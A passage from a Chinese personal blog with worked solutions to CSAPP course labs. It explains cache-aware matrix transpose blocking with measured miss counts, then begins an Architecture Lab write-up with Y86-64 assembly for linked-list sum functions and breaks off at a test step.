<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">8</span>; k++)</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> s = <span class="number">0</span>; s &lt; <span class="number">8</span>; s++)</span><br><span class="line">                    B[j + s][i + k] = A[i + k][j + s];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于<code>A</code>中每一个操作块，只有每一行的第一个元素会不命中，所以为8次不命中；对于<code>B</code>中每一个操作块，只有每一列的第一个元素会不命中，所以也为 8 次不命中。总共<code>miss</code>次数为：8 × 16 × 2 &#x3D; 256</p>
<p>跑出结果：</p>
<p><img src="/../../../Img/image-20220320151955781.png" alt="image-20220320151955781"></p>
<p><code>miss</code>次数为343，与我们计算的结果差距非常大，没有得到满分，这是为什么呢？这就要考虑到对角线上的块了。<code>A</code>与<code>B</code>对角线上的块在缓存中对应的位置是相同的，而它们在转置过程中位置不变，所以复制过程中会发生相互冲突。</p>
<p>以<code>A</code>的一个对角线块<code>p</code>，<code>B</code>与<code>p</code>相应的对角线块<code>q</code>为例，复制前， <code>p</code> 在缓存中。 复制时，<code>q</code>会驱逐<code>p</code>。 下一个开始复制 <code>p</code> 又被重新加载进入缓存驱逐 <code>q</code>，这样就会多产生两次<code>miss</code>。</p>
<p>如何解决这种问题呢？题目给了我们提示：</p>
<blockquote>
<p>You are allowed to define at most 12 local variables of type int per transpose function</p>
</blockquote>
<p>考虑使用 8 个本地变量一次性存下 <code>A</code> 的一行后，再复制给 <code>B</code>。代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j += <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; i + <span class="number">8</span>; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> a_0 = A[k][j];</span><br><span class="line">                <span class="type">int</span> a_1 = A[k][j+<span class="number">1</span>];</span><br><span class="line">                <span class="type">int</span> a_2 = A[k][j+<span class="number">2</span>];</span><br><span class="line">                <span class="type">int</span> a_3 = A[k][j+<span class="number">3</span>];</span><br><span class="line">                <span class="type">int</span> a_4 = A[k][j+<span class="number">4</span>];</span><br><span class="line">                <span class="type">int</span> a_5 = A[k][j+<span class="number">5</span>];</span><br><span class="line">                <span class="type">int</span> a_6 = A[k][j+<span class="number">6</span>];</span><br><span class="line">                <span class="type">int</span> a_7 = A[k][j+<span class="number">7</span>];</span><br><span class="line">                B[j][k] = a_0;</span><br><span class="line">                B[j+<span class="number">1</span>][k] = a_1;</span><br><span class="line">                B[j+<span class="number">2</span>][k] = a_2;</span><br><span class="line">                B[j+<span class="number">3</span>][k] = a_3;</span><br><span class="line">                B[j+<span class="number">4</span>][k] = a_4;</span><br><span class="line">                B[j+<span class="number">5</span>][k] = a_5;</span><br><span class="line">                B[j+<span class="number">6</span>][k] = a_6;</span><br><span class="line">                B[j+<span class="number">7</span>][k] = a_7;</span><br><span class="line">            &#125;         </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于非对角线上的块，本身就没有额外的冲突；对于对角线上的块，写入<code>A</code>每一行的第一个元素后，这一行的元素都进入了缓存，我们就立即用本地变量存下这 8 个元素，随后再复制给<code>B</code>。这样，就避免了第一个元素复制时，<code>B</code>把<code>A</code>的缓冲行驱逐，导致没有利用上<code>A</code>的缓冲。</p>
<p>结果如下：</p>
<p><img src="/../../../Img/image-20220320153742897.png" alt="image-20220320153742897"></p>
<p><code>miss</code>次数为 287，满分！</p>
<h2 id="64-×-64"><a href="#64-×-64" class="headerlink" title="64 × 64"></a>64 × 64</h2><p>每 4 行就会占满一个缓存，先考虑 4 × 4 分块，结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220320160556089.png" alt="image-20220320160556089"></p>
<p>结果还不错，虽然没有得到满分。</p>
<p>还是考虑 8 × 8 分块，由于存在着每 4 行就会占满一个缓存的问题，在分块内部处理时就需要技巧了，我们把分块内部分成 4 个 4 × 4 的小分块分别处理：</p>
<ul>
<li>第一步，将<code>A</code>的左上和右上一次性复制给<code>B</code></li>
<li>第二步，用本地变量把<code>B</code>的右上角存储下来</li>
<li>第三步，将<code>A</code>的左下复制给<code>B</code>的右上</li>
<li>第四步，利用上述存储<code>B</code>的右上角的本地变量，把<code>A</code>的右上复制给<code>B</code>的左下</li>
<li>第五步，把<code>A</code>的右下复制给<code>B</code>的右下</li>
</ul>
<p>画出图解如下：</p>
<p><strong>这里的<code>A</code>和<code>B</code>均表示两个矩阵中的 8 × 8 块</strong></p>
<p><strong>第 1 步：</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220321100111526.png" alt="image-20220321100111526"></p>
<p>此时<code>B</code>的前 4 行就在缓存中了，接下来考虑利用这个缓存 。可以看到，为了利用<code>A</code>的缓存，第 2 块放置的位置实际上是错的，接下来就用本地变量保存<code>B</code>中 2 块的内容</p>
<p><strong>第 2 步：</strong></p>
<p>用本地变量把<code>B</code>的 2 块存储下来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = j; k &lt; j + <span class="number">4</span>; k++)&#123;</span><br><span class="line">	a_0 = B[k][i + <span class="number">4</span>];</span><br><span class="line">    a_1 = B[k][i + <span class="number">5</span>];</span><br><span class="line">    a_2 = B[k][i + <span class="number">6</span>];</span><br><span class="line">    a_3 = B[k][i + <span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>第 3 步：</strong></p>
<p>现在缓存中还是存着<code>B</code>中上两块的内容，所以将<code>A</code>的 3 块内容复制给它</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220321122954046.png" alt="image-20220321122954046"></p>
<p><strong>第 4&#x2F;5 步：</strong></p>
<p>现在缓存已经利用到极致了，可以开辟<code>B</code>的下面两块了</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220321123518762.png" alt="image-20220321123518762"></p>
<p>这样就实现了转置，且消除了同一行中的冲突，具体代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_64x64</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a_0, a_1, a_2, a_3, a_4, a_5, a_6, a_7;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j += <span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; i + <span class="number">4</span>; k++)&#123;</span><br><span class="line">                <span class="comment">// 得到A的第1,2块</span></span><br><span class="line">                a_0 = A[k][j + <span class="number">0</span>];</span><br><span class="line">                a_1 = A[k][j + <span class="number">1</span>];</span><br><span class="line">                a_2 = A[k][j + <span class="number">2</span>];</span><br><span class="line">                a_3 = A[k][j + <span class="number">3</span>];</span><br><span class="line">                a_4 = A[k][j + <span class="number">4</span>];</span><br><span class="line">                a_5 = A[k][j + <span class="number">5</span>];</span><br><span class="line">                a_6 = A[k][j + <span class="number">6</span>];</span><br><span class="line">                a_7 = A[k][j + <span class="number">7</span>];</span><br><span class="line">				<span class="comment">// 复制给B的第1,2块</span></span><br><span class="line">                B[j + <span class="number">0</span>][k] = a_0;</span><br><span class="line">                B[j + <span class="number">1</span>][k] = a_1;</span><br><span class="line">                B[j + <span class="number">2</span>][k] = a_2;</span><br><span class="line">                B[j + <span class="number">3</span>][k] = a_3;</span><br><span class="line">                B[j + <span class="number">0</span>][k + <span class="number">4</span>] = a_4;</span><br><span class="line">                B[j + <span class="number">1</span>][k + <span class="number">4</span>] = a_5;</span><br><span class="line">                B[j + <span class="number">2</span>][k + <span class="number">4</span>] = a_6;</span><br><span class="line">                B[j + <span class="number">3</span>][k + <span class="number">4</span>] = a_7;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = j; k &lt; j + <span class="number">4</span>; k++)&#123;</span><br><span class="line">                <span class="comment">// 得到B的第2块</span></span><br><span class="line">                a_0 = B[k][i + <span class="number">4</span>];</span><br><span class="line">                a_1 = B[k][i + <span class="number">5</span>];</span><br><span class="line">                a_2 = B[k][i + <span class="number">6</span>];</span><br><span class="line">                a_3 = B[k][i + <span class="number">7</span>];</span><br><span class="line">				<span class="comment">// 得到A的第3块</span></span><br><span class="line">                a_4 = A[i + <span class="number">4</span>][k];</span><br><span class="line">                a_5 = A[i + <span class="number">5</span>][k];</span><br><span class="line">                a_6 = A[i + <span class="number">6</span>][k];</span><br><span class="line">                a_7 = A[i + <span class="number">7</span>][k];</span><br><span class="line">				<span class="comment">// 复制给B的第2块</span></span><br><span class="line">                B[k][i + <span class="number">4</span>] = a_4;</span><br><span class="line">                B[k][i + <span class="number">5</span>] = a_5;</span><br><span class="line">                B[k][i + <span class="number">6</span>] = a_6;</span><br><span class="line">                B[k][i + <span class="number">7</span>] = a_7;</span><br><span class="line">				<span class="comment">// B原来的第2块移动到第3块</span></span><br><span class="line">                B[k + <span class="number">4</span>][i + <span class="number">0</span>] = a_0;</span><br><span class="line">                B[k + <span class="number">4</span>][i + <span class="number">1</span>] = a_1;</span><br><span class="line">                B[k + <span class="number">4</span>][i + <span class="number">2</span>] = a_2;</span><br><span class="line">                B[k + <span class="number">4</span>][i + <span class="number">3</span>] = a_3;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = i + <span class="number">4</span>; k &lt; i + <span class="number">8</span>; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 处理第4块</span></span><br><span class="line">                a_4 = A[k][j + <span class="number">4</span>];</span><br><span class="line">                a_5 = A[k][j + <span class="number">5</span>];</span><br><span class="line">                a_6 = A[k][j + <span class="number">6</span>];</span><br><span class="line">                a_7 = A[k][j + <span class="number">7</span>];</span><br><span class="line">                B[j + <span class="number">4</span>][k] = a_4;</span><br><span class="line">                B[j + <span class="number">5</span>][k] = a_5;</span><br><span class="line">                B[j + <span class="number">6</span>][k] = a_6;</span><br><span class="line">                B[j + <span class="number">7</span>][k] = a_7;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220321124218012.png" alt="image-20220321124218012"></p>
<p><code>miss</code>为 1227，通过！</p>
<h2 id="61-×-67"><a href="#61-×-67" class="headerlink" title="61 × 67"></a>61 × 67</h2><p>这个矩阵的转置要求很松，<code>miss</code>为 2000 以下就可以了。我也无心进行更深入的优化，直接 16 × 16 的分块就能通过。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220321124555383.png" alt="image-20220321124555383"></p>
<p><code>miss</code>为 1992，擦线满分！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>先附上满分完结图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220320174115169.png" alt="image-20220320174115169"></p>
<ul>
<li>Cache Lab 是我在做前 5 个实验中感觉最痛苦的一个，主要原因在于我的代码能力较弱，逻辑思维能力较差，以后应该加强这方面的训练</li>
<li>这个实验的 Part A 让我对缓存的设计有了更深入的理解，其中替换策略也值得以后继续研究；Part B 为我展示了计算机之美，一个简简单单的转置函数，无论怎么写，时间复杂度都是$O(n^2)$，然而因为缓冲区的问题，不同代码的性能竟然有着天壤之别。编写函数过程中，对<code>miss</code>的估量与计算很烧脑，但也很有趣</li>
<li>本实验耗时 2 天，约 20 小时</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://deconx.top/2022/03/13/CSAPP-Lab04/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/panda.jpg">
      <meta itemprop="name" content="西门吹水">
      <meta itemprop="description" content="天行健，君子以自强不息">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="潜龙勿用">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/13/CSAPP-Lab04/" class="post-title-link" itemprop="url">CSAPP-Lab04 Architecture Lab 记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-03-13 16:28:24" itemprop="dateCreated datePublished" datetime="2022-03-13T16:28:24+08:00">2022-03-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-06-10 23:55:37" itemprop="dateModified" datetime="2022-06-10T23:55:37+08:00">2022-06-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSAPP-Lab/" itemprop="url" rel="index"><span itemprop="name">CSAPP Lab</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>15 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>穷且益坚，不坠青云之志。</p>
</blockquote>
<h1 id="实验概览"><a href="#实验概览" class="headerlink" title="实验概览"></a>实验概览</h1><p>Arch Lab 实验分为三部分。在 A 部分中，需要我们写一些简单的<code>Y86-64</code>程序，从而熟悉<code>Y86-64</code>工具的使用；在 B 部分中，我们要用一个新的指令来扩展<code>SEQ</code>；C 部分是本实验的核心，我们要通过理解流水线的过程以及利用新的指令来优化程序。</p>
<p>实验材料中有一个<code>archlab.pdf</code>，按照文档一步步往下走就可以了。<code>make</code>时，可能会缺少相关依赖，安装如下软件即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install tcl tcl-dev tk tk-dev</span><br><span class="line">sudo apt install flex</span><br><span class="line">sudo apt install bison</span><br></pre></td></tr></table></figure>

<h1 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h1><p>在这部分，要用<code>Y86-64</code>汇编代码实现<code>examples.c</code>中的三个函数。这三个函数都是与链表有关的操作，链表结点定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linked list element */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; *list_ptr;</span><br></pre></td></tr></table></figure>

<p>在编写汇编代码之前，我们先回顾一下<code>Y86-64</code>的指令集：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># movq i--&gt;r: 从立即数到寄存器...</span><br><span class="line">irmovq, rrmovq, mrmovq, rmmovq</span><br><span class="line"></span><br><span class="line"># Opq</span><br><span class="line">addq, subq, andq, xorq</span><br><span class="line"></span><br><span class="line"># 跳转 jXX</span><br><span class="line">jmp, jle, jl, je, jne, jge, jg</span><br><span class="line"></span><br><span class="line"># 条件传送 cmovXX</span><br><span class="line">cmovle, cmovl, cmove, cmovne, cmovge, cmovg</span><br><span class="line"></span><br><span class="line">call, ret</span><br><span class="line">pushq, popq</span><br><span class="line"></span><br><span class="line"># 停止指令的执行</span><br><span class="line">halt</span><br><span class="line"></span><br><span class="line"># 寄存器</span><br><span class="line">%rax, %rcx, %rdx</span><br><span class="line">%rbx, %rsp, %rbp</span><br><span class="line">%rsi, %rdi, %r8</span><br><span class="line">%r9, %r10, %r11</span><br><span class="line">%r12, %r13, %r14</span><br></pre></td></tr></table></figure>

<h2 id="sum-list"><a href="#sum-list" class="headerlink" title="sum_list"></a>sum_list</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sum_list - Sum the elements of a linked list */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">sum_list</span><span class="params">(list_ptr ls)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ls) &#123;</span><br><span class="line">        val += ls-&gt;val;</span><br><span class="line">        ls = ls-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本题就是一个链表求和，非常简单。但要注意，这里不仅要写出函数段，还应该写出测试的代码段。直接给出转换后的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># sum_list - Sum the elements of a linked list</span><br><span class="line"># author: Deconx</span><br><span class="line"></span><br><span class="line"># Execution begins at address 0</span><br><span class="line">        .pos 0</span><br><span class="line">        irmovq stack, %rsp      # Set up stack pointer</span><br><span class="line">        call main               # Execute main program</span><br><span class="line">        halt                    # Terminate program</span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">        .align 8</span><br><span class="line">ele1:</span><br><span class="line">        .quad 0x00a</span><br><span class="line">        .quad ele2</span><br><span class="line">ele2:</span><br><span class="line">        .quad 0x0b0</span><br><span class="line">        .quad ele3</span><br><span class="line">ele3:</span><br><span class="line">        .quad 0xc00</span><br><span class="line">        .quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">        irmovq ele1,%rdi</span><br><span class="line">        call sum_list</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line"># long sum_list(list_ptr ls)</span><br><span class="line"># start in %rdi</span><br><span class="line">sum_list:</span><br><span class="line">        irmovq $0, %rax</span><br><span class="line">        jmp test</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">        mrmovq (%rdi), %rsi</span><br><span class="line">        addq %rsi, %rax</span><br><span class="line">        mrmovq 8(%rdi), %rdi</span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">        andq %rdi, %rdi</span><br><span class="line">        jne loop</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line"># Stack starts here and grows to lower addresses</span><br><span class="line">        .pos 0x200</span><br><span class="line">stack: </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意，应在<code>stack</code>下方空一行，否则汇编器会报错，报错原因我也不清楚。</p>
<p>利用实验文件中给的<code>YAS</code>汇编器进行汇编，<code>YIS</code>指令集模拟器运行<strong>测试</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./yas sum.ys</span><br><span class="line">./yis sum.yo</span><br></pre></td></tr></table></figure>

<p>得到结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220312124402451.png" alt="image-20220312124402451"></p>
<p>返回值<code>%rax=0xcba=0x00a+0x0b0+0xc00</code>，<strong>结果正确！</strong></p>
<h2 id="rsum-list"><a href="#rsum-list" class="headerlink" title="rsum_list"></a>rsum_list</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* rsum_list - Recursive version of sum_list */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">rsum_list</span><span class="params">(list_ptr ls)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!ls)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">long</span> val = ls-&gt;val;</span><br><span class="line">        <span class="type">long</span> rest = rsum_list(ls-&gt;next);</span><br><span class="line">        <span class="keyword">return</span> val + rest;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是链表求和的递归实现，按照C语言代码的过程模拟即可，思路非常清晰，可以参考我的注释</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># /* rsum_list - Recursive version of sum_list */</span><br><span class="line"># author: Deconx</span><br><span class="line"></span><br><span class="line"># Execution begins at address 0</span><br><span class="line">        .pos 0</span><br><span class="line">        irmovq stack, %rsp      # Set up stack pointer</span><br><span class="line">        call main               # Execute main program</span><br><span class="line">        halt                    # Terminate program</span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">        .align 8</span><br><span class="line">ele1:</span><br><span class="line">        .quad 0x00a</span><br><span class="line">        .quad ele2</span><br><span class="line">ele2:</span><br><span class="line">        .quad 0x0b0</span><br><span class="line">        .quad ele3</span><br><span class="line">ele3:</span><br><span class="line">        .quad 0xc00</span><br><span class="line">        .quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">        irmovq ele1,%rdi</span><br><span class="line">        call rsum_list</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line"># long sum_list(list_ptr ls)</span><br><span class="line"># start in %rdi</span><br><span class="line">rsum_list:</span><br><span class="line">        andq %rdi, %rdi</span><br><span class="line">        je return               # if(!ls)</span><br><span class="line">        mrmovq (%rdi), %rbx     # val = ls-&gt;val</span><br><span class="line">        mrmovq 8(%rdi), %rdi    # ls = ls-&gt;next</span><br><span class="line">        pushq %rbx</span><br><span class="line">        call rsum_list          # rsum_list(ls-&gt;next)</span><br><span class="line">        popq %rbx</span><br><span class="line">        addq %rbx, %rax         # val + rest</span><br><span class="line">        ret</span><br><span class="line">return:</span><br><span class="line">        irmovq $0, %rax</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Stack starts here and grows to lower addresses</span><br><span class="line">        .pos 0x200</span><br><span class="line">stack: </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>测试</strong></p>
